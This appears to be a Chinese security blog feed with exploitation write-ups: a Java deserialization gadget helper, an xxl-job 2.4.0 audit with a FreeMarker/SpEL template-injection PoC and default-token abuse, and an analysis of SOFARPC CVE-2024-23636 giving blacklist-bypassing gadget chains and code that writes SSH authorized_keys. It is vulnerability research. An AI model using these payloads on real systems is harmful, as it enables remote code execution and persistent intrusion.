ObjectOutputStream(new FileOutputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        inputStream.readObject();</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmap</span><span class="hljs-params">(Object u1,Object u2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, u2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        key.setAccessible(<span class="hljs-literal">true</span>);<br>        key.set(node1, u1);<br>        key.set(node2, u2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-literal">true</span>);<br>        size.set(hashMap, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>        Array.set(arr, <span class="hljs-number">0</span>, node1);<br>        Array.set(arr, <span class="hljs-number">1</span>, node2);<br>        table.set(hashMap, arr);<br><br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://xz.aliyun.com/t/11961?time__1311=mqmx0DBG0Qi=Ax0veeqBKuGUD97oDn767YD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/11961?time__1311=mqmx0DBG0Qi%3DAx0veeqBKuGUD97oDn767YD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17020853.html">https://www.cnblogs.com/kingbridge/articles/17020853.html</a></p><p><a href="https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java-gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxljob-2.4.0代码审计</title>
    <link href="/2024/02/20/xxljob-2-4-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/02/20/xxljob-2-4-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="xxljob-2-4-0-代码审计"><a href="#xxljob-2-4-0-代码审计" class="headerlink" title="xxljob-2.4.0 代码审计"></a>xxljob-2.4.0 代码审计</h2><p><img src="68747470733a2f2f7777772e78757875656c692e636f6d2f646f632f7374617469632f78786c2d6a6f622f696d616765732f78786c2d6c6f676f2e6a7067.jpeg" alt="img"></p><h3 id="0x01-一些需要的知识"><a href="#0x01-一些需要的知识" class="headerlink" title="0x01 一些需要的知识"></a>0x01 一些需要的知识</h3><p>​XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。本次主要针对xxl-job的调度流程。</p><p><img src="v2-77c0beede344064305e9fc39b46cb07b_720w.webp" alt="img"></p><p><img src="v2-00df2ceeb5cd6ac329dbc526cedef0fa_720w.webp" alt="img"></p><h3 id="0x02-xxljob主要使用的api"><a href="#0x02-xxljob主要使用的api" class="headerlink" title="0x02 xxljob主要使用的api"></a>0x02 xxljob主要使用的api</h3><p><strong>客户端注册和执行结果上报（客户端发送给服务端）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">callback</span><span class="hljs-params">(List&lt;HandleCallbackParam&gt; callbackParamList)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl+<span class="hljs-string">&quot;api/callback&quot;</span>, accessToken, timeout, callbackParamList, String.class);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">registry</span><span class="hljs-params">(RegistryParam registryParam)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl + <span class="hljs-string">&quot;api/registry&quot;</span>, accessToken, timeout, registryParam, String.class);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> ReturnT&lt;String&gt; <span class="hljs-title function_">registryRemove</span><span class="hljs-params">(RegistryParam registryParam)</span> &#123;<br>    <span class="hljs-keyword">return</span> XxlJobRemotingUtil.postBody(addressUrl + <span class="hljs-string">&quot;api/registryRemove&quot;</span>, accessToken, timeout, registryParam, String.class);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-registry：注册客户端信息"><a href="#1-registry：注册客户端信息" class="headerlink" title="1 &#x2F;registry：注册客户端信息"></a>1 &#x2F;registry：注册客户端信息</h4><p>启动线程定时注册自己的服务到调度器；</p><p>创建线程，30s轮询一次，上报注册信息。</p><h4 id="2-registryRemove：移出执行器请求"><a href="#2-registryRemove：移出执行器请求" class="headerlink" title="2 &#x2F;registryRemove：移出执行器请求"></a>2 &#x2F;registryRemove：移出执行器请求</h4><p>将自己从执行器列表移除；</p><p>程序退出时会调用一次，在Netty的finally代码块自动执行。</p><h4 id="3-callback：异步回调结果"><a href="#3-callback：异步回调结果" class="headerlink" title="3 &#x2F;callback：异步回调结果"></a>3 &#x2F;callback：异步回调结果</h4><p>执行器异步回调给调度器执行任务结果；</p><p>每次任务完成时上报。</p><h4 id="4-对应的数据形式"><a href="#4-对应的数据形式" class="headerlink" title="4 对应的数据形式"></a>4 对应的数据形式</h4><p><strong>（1）客户端注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/registry</span><br>&#123;<br>    <span class="hljs-string">&quot;registryGroup&quot;</span>: <span class="hljs-string">&quot;EXECUTOR&quot;</span><br>    <span class="hljs-string">&quot;registryKey&quot;</span>: <span class="hljs-string">&quot;xxl-job-executor-sample&quot;</span><br>    <span class="hljs-string">&quot;registryValue&quot;</span>: <span class="hljs-string">&quot;http://172.30.0.67:9999/&quot;</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（2）客户端移除注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/registryRemove</span><br>&#123;<br>    <span class="hljs-string">&quot;registryGroup&quot;</span>: <span class="hljs-string">&quot;EXECUTOR&quot;</span><br>    <span class="hljs-string">&quot;registryKey&quot;</span>: <span class="hljs-string">&quot;xxl-job-executor-sample&quot;</span><br>    <span class="hljs-string">&quot;registryValue&quot;</span>: <span class="hljs-string">&quot;http://xxljob-axzo.cn&quot;</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（3）客户端执行任务结果上报</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//127.0.0.1:8080/xxl-job-admin/api/callback</span><br>&#123;<br>    <span class="hljs-string">&quot;logId&quot;</span>: <span class="hljs-number">1238</span><br>    <span class="hljs-string">&quot;logDateTim&quot;</span>: <span class="hljs-number">1667197980007</span><br>    <span class="hljs-string">&quot;handleCode&quot;</span>: <span class="hljs-number">200</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（4）执行器下发任务：同步回调仅代表任务是否发送成功</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//172.30.0.67:9999/run</span><br>&#123;<br>    <span class="hljs-string">&quot;jobId&quot;</span>: <span class="hljs-number">4</span><br>    <span class="hljs-string">&quot;executorHandler&quot;</span>: <span class="hljs-string">&quot;demoJobHandler&quot;</span><br>    <span class="hljs-string">&quot;executorParams&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-string">&quot;executorBlockStrategy&quot;</span>: <span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span><br>    <span class="hljs-string">&quot;executorTimeout&quot;</span>: <span class="hljs-number">0</span><br>    <span class="hljs-string">&quot;logId&quot;</span>: <span class="hljs-number">1238</span><br>    <span class="hljs-string">&quot;logDateTime&quot;</span>: <span class="hljs-number">1667197980007</span><br>    <span class="hljs-string">&quot;glueType&quot;</span>: <span class="hljs-string">&quot;BEAN&quot;</span><br>    <span class="hljs-string">&quot;glueSource&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-string">&quot;glueUpdatetime&quot;</span>: <span class="hljs-number">1666683613000</span><br>    <span class="hljs-string">&quot;broadcastIndex&quot;</span>: <span class="hljs-number">0</span><br>    <span class="hljs-string">&quot;broadcastTotal&quot;</span>: <span class="hljs-number">1</span><br>&#125;<br><br>Response:<br>&#123;<br>    <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span><br>    <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">null</span><br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-Token配置详解"><a href="#5-Token配置详解" class="headerlink" title="5 Token配置详解"></a>5 Token配置详解</h4><p>1.配置了token后，client发送的每隔http请求头会带上XXL-JOB-ACCESS-TOKEN ：{xxl.job.accessToken} ；</p><p>2.该参数不会对请求参数加密；</p><p>3.如果配置不匹配，客户端请求报错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">500</span><br><span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;The access token is wrong.&quot;</span><br><span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-literal">null</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​<img src="image-20240220201211776.png" alt="image-20240220201211776"></p><p>默认为default_token</p><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03  代码分析"></a>0x03  代码分析</h3><p>​本次主要针对注册器的代码进行审计。</p><p><img src="image-20240220201858316.png" alt="image-20240220201858316"></p><p>客户端使用xxl-job-core</p><p>在这个com.xxl.job.core工具类里用一个可以利用的点。</p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;JdkSerializeTool.java 反序列化</p><p><img src="image-20240220202223069.png" alt="image-20240220202223069"></p><p>可控而且是public。</p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;ScriptUtil.java   写文件，执行命令</p><p><img src="image-20240220202439049.png" alt="image-20240220202439049">z</p><p><img src="image-20240220202446553.png" alt="image-20240220202446553"></p><p>com&#x2F;xxl&#x2F;job&#x2F;core&#x2F;util&#x2F;FileUtil.java</p><p><img src="image-20240220202703421.png" alt="image-20240220202703421"></p><p>等等。都是可以直接调用。</p><p>很容易可以想到利用方式就是写文件，或者代码执行，任意文件删除。</p><p><img src="image-20240220205604031.png" alt="image-20240220205604031"></p><p>xxljob使用了freemarker模版进行渲染，渲染路径为classpath下的&#x2F;templates&#x2F;</p><p><img src="image-20240220205912442.png" alt="image-20240220205912442"></p><p>freemarker版本是2.3.32，也就是说通过文件写入恶意的模版文件，就能造成代码执行。</p><p><img src="image-20240220214644221.png" alt="image-20240220214644221"></p><p>全局拦截器的代码，</p><p><img src="image-20240220214707275.png" alt="image-20240220214707275"></p><p>对应的实现类。</p><p><img src="image-20240220214841612.png" alt="image-20240220214841612"></p><p>或者这个，然后判读用户</p><p><img src="image-20240220215457794.png" alt="image-20240220215457794"></p><p>进行16进制处理。</p><p><img src="image-20240220215549379.png" alt="image-20240220215549379"></p><p><img src="image-20240220215615914.png" alt="image-20240220215615914"></p><p>然后判断用户是否存在，若果存在，在继续判断密码的md5值是否等于数据里对应的值。看来是无法绕过拦截器的。这样看来其实，token也是一个隐患，永不过期，嗅探到数据包，也是可以永久使用。</p><h3 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h3><p>poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?new()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(<span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a calculator\&quot;)&quot;</span>).getValue()&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240220210430937.png" alt="image-20240220210430937"></p><p>执行后修改了登录页的模版。再次打开就能造成代码执行。</p><p><img src="image-20240220210722090.png" alt="image-20240220210722090"></p><p>当然利用9999默认token也是可以的。</p><p><img src="image-20240220213846313.png" alt="image-20240220213846313"></p><p><img src="image-20240220213904413.png" alt="image-20240220213904413"></p><p>这里直接使用反射获取classloader去加载内存马，注意，这里可以使用jMG v1.0.7.beta3生成的马子，端口为8081，但是实战中，8081这个端口基本不存在，只有9999端口实战可利用，所以需要打netty的内存马。本质上攻击的是注册器（client），xxljob是注册中心（server）,也有情况，server，client在一台机器上。</p><p><img src="image-20240220221245756.png" alt="image-20240220221245756"></p><p>这个马子实战鸡肋。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>​没什么用，主要还是利用默认的token去更改一些配置。而且，本来就可以自定义代码，想怎么写就怎么写，所以用不用core里面的工具类也无上大雅。直接使用反射获取classloader去加载内存马就可以，或者直接执行shell脚本就行。这个修改模版很鸡肋，若果使用jar包部署，也无法去修改jar里面的classpath，鸡肋中的鸡肋，弃之可惜，鸡肋一下。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://zhuanlan.zhihu.com/p/587813289">https://zhuanlan.zhihu.com/p/587813289</a></p><p><a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><a href="https://github.com/zema1/suo5">https://github.com/zema1/suo5</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SOFARPC反序列化漏洞（CVE-2024-23636</title>
    <link href="/2024/02/10/SOFARPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23636/"/>
    <url>/2024/02/10/SOFARPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23636/</url>
    
    <content type="html"><![CDATA[<h2 id="SOFARPC反序列化漏洞（CVE-2024-23636）浅析"><a href="#SOFARPC反序列化漏洞（CVE-2024-23636）浅析" class="headerlink" title="SOFARPC反序列化漏洞（CVE-2024-23636）浅析"></a>SOFARPC反序列化漏洞（CVE-2024-23636）浅析</h2><p>​首发于先知 <a href="https://xz.aliyun.com/t/13462">https://xz.aliyun.com/t/13462</a></p><p><img src="image-20240210093310560.png" alt="image-20240210093310560"></p><h3 id="0x01-SOFARPC简介"><a href="#0x01-SOFARPC简介" class="headerlink" title="0x01 SOFARPC简介"></a>0x01 SOFARPC简介</h3><p>​SOFARPC 是一个高性能、高扩展性、生产级的 Java RPC 框架。</p><p>​2024年1月24日，启明星辰VSRC监测到SOFARPC中修复了一个反序列化漏洞（CVE-2024-23636），该漏洞的CVSSv3评分为9.8。由于SOFARPC 默认使用 SOFA Hessian 协议来反序列化接收到的数据，而 SOFA Hessian 协议使用黑名单机制来限制危险类的反序列化。SOFARPC 版本5.12.0之前，威胁者可通过Gadget链（只依赖于JDK，不依赖任何第三方组件）绕过SOFA Hessian黑名单保护机制，导致远程代码执行。</p><h3 id="0x02-序列化分析"><a href="#0x02-序列化分析" class="headerlink" title="0x02 序列化分析"></a>0x02 序列化分析</h3><p>​sofa-rpc默认使用 SOFA Hessian 协议来反序列化接收到的数据，所以，下载源码去看对应的实现。</p><p>​对应的代码在com.alipay.sofa.rpc.codec.sofahessian这个包下面</p><p>com&#x2F;alipay&#x2F;sofa&#x2F;rpc&#x2F;codec&#x2F;sofahessian&#x2F;SofaHessianSerializer.java# encode()</p><p><img src="image-20240128231107461.png" alt="image-20240128231107461"></p><p>这里先对传入obj获取对应的serializer，若果没有获取到，就使用默认Hessian进行序列化。</p><p>com&#x2F;alipay&#x2F;sofa&#x2F;rpc&#x2F;codec&#x2F;sofahessian&#x2F;SofaHessianSerializer.java# decode()</p><p><img src="image-20240128231546627.png" alt="image-20240128231546627"></p><p><img src="image-20240128231553036.png" alt="image-20240128231553036"></p><p><img src="image-20240128231751972.png" alt="image-20240128231751972"></p><p>对应两种反序列方式，可以看到就是hessian序列化和反序列化外面套了一成。</p><p><img src="image-20240128234225056.png" alt="image-20240128234225056"></p><p>尝试一下，直接调用它的序列化，反序列化方法是能可以命令执行的。</p><p>因为直接调用它的序列化和反序列函数，是没用过黑名单的。</p><p>具体的流程就是非常短的一条链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.putVal<br>    UIDefault.equals<br>  Hashtable.equals<br>  UIDefault.get<br>  UIDefault.getFromHashtable<br>        SwingLazyValue.createValue<br></code></pre></td></tr></table></figure><p>简单说就是UIDefault它里面没有equals方法，调用它的父类的equals，然后触发UIDefault.get。完成了 only jdk的调用。</p><p><img src="image-20240128235029800.png" alt="image-20240128235029800"></p><p>这是tostring的方式。</p><h3 id="0x03-exp构造分析"><a href="#0x03-exp构造分析" class="headerlink" title="0x03  exp构造分析"></a>0x03  exp构造分析</h3><p><img src="image-20240128235158909.png" alt="image-20240128235158909"></p><p>通告里面写的org.apache.xpath这个类。</p><p><a href="https://github.com/sofastack/sofa-rpc/blob/v5.11.0/codec/codec-sofa-hessian/src/main/resources/sofa-rpc/serialize_blacklist.txt">5.11.0黑名单</a></p><p>这是5.10对应的黑名单.</p><p><img src="image-20240129000843942.png" alt="image-20240129000843942"></p><p>支队这个类做了限制。</p><p>所以很容易想到就是  com.sun.org.apache.xpath.internal.objects.XString.equal去触发toString。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.swing</span><span class="hljs-selector-class">.MultiUIDefaults</span><span class="hljs-selector-class">.toString</span><br>           UIDefaults<span class="hljs-selector-class">.get</span><br>               UIDefaults<span class="hljs-selector-class">.getFromHashTable</span><br>                   UIDefaults<span class="hljs-variable">$LazyValue</span><span class="hljs-selector-class">.createValue</span><br>                   SwingLazyValue<span class="hljs-selector-class">.createValue</span><br>                       javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.doLookup</span>()<br></code></pre></td></tr></table></figure><p>但是5.11.1新增黑名单javax.swing.UIDefaults</p><p>所以上面的链子在小于5.11.1 是可以使用的。</p><p>5.11.1既然能触发tostring能想到的去连json的序列化触发getter。(Jackson、fastjson在目前最新版5.12也没在黑名单里)</p><p>5.12 黑名单<a href="https://github.com/sofastack/sofa-rpc/blob/v5.12.0/codec/codec-api/src/main/resources/sofa-rpc/serialize_blacklist.txt">https://github.com/sofastack/sofa-rpc/blob/v5.12.0/codec/codec-api/src/main/resources/sofa-rpc/serialize_blacklist.txt</a> 增加到了一百七十多个</p><p><img src="image-20240129013853886.png" alt="image-20240129013853886"></p><p>就是这种直接全搬掉了，但是hashmap和json没办。 就是可以找找haspmap的hashcode、equals触发toString然后触发getter。</p><h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h3><p>用项目里的例子起一个服务端。参考泛化调用说明可以见：<a href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p><p><img src="image-20240129001845905.png" alt="image-20240129001845905"></p><p>构建好exp用客户端发送payload到服务端就可以了。</p><p><img src="image-20240129002015075.png" alt="image-20240129002015075"></p><p>把黑名单替换为5.11.0的黑名单</p><p><img src="image-20240129002251587.png" alt="image-20240129002251587"></p><p>可以看到是可以攻击成功的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XStringForFSB.equal<br>        javax.swing.MultiUIDefaults.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>就是hessian在序列化Treemap时会触发compareTo。hessian这里就不做分析。</p><p><strong>5.11.1 本人技术有限，暂没找到原生触发</strong>。然后想到的利用方式就是tostring去触发json序列化。环境有fastjson2，jackson。</p><p>还有一条是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet.putAll<br>javax.naming.ldap.Rdn$RdnEntry.compareTo<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.sound.sampled.AudioFileFormat.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><p>就换了一下中间的步骤。 看2023的那个cve遇警搬掉的就是javax.sound.sampled.AudioFileFormat。</p><p>也就是说这次的2024就是他的绕过呗。</p><h3 id="0x05-扩展一下攻击面"><a href="#0x05-扩展一下攻击面" class="headerlink" title="0x05 扩展一下攻击面"></a>0x05 扩展一下攻击面</h3><p>SwingLazyValue.createValue可以调用sun.reflect.misc.MethodUtil.invoke方法达到任意类的任意方法调用，那这就有意思了。(试了下，hessian3.x好像不能用这个，4.x可以，写了就留着吧)</p><h4 id="一、不出网就写文件"><a href="#一、不出网就写文件" class="headerlink" title="一、不出网就写文件"></a>一、不出网就写文件</h4><p>写ssh</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//            二、利用JavaUtils.writeBytesToFilename写文件</span><br>       <span class="hljs-type">byte</span>[] allBytes = Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/snake/.ssh/authorized_keys&quot;</span>).toPath());<br>        Constructor&lt;?&gt; JavaUtils = JavaUtils.class.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        JavaUtils.setAccessible(<span 